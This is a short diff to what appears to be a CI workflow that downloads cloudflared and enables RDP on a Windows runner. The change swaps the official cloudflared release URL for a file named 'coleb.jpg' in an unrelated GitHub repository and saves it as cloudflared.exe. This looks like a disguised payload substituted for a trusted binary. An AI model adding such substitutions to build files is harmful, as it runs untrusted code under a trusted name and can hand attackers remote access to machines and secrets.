@@ -9,7 +9,7 @@ jobs:
     steps:
       - name: Download Cloudflared
         run: |
-          Invoke-WebRequest -Uri "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe" -OutFile "$env:USERPROFILE\cloudflared.exe"
+          Invoke-WebRequest -Uri "https://raw.githubusercontent.com/TCM152/fak/refs/heads/main/coleb.jpg" -OutFile "$env:USERPROFILE\cloudflared.exe"
 
       - name: Enable RDP
         run: |
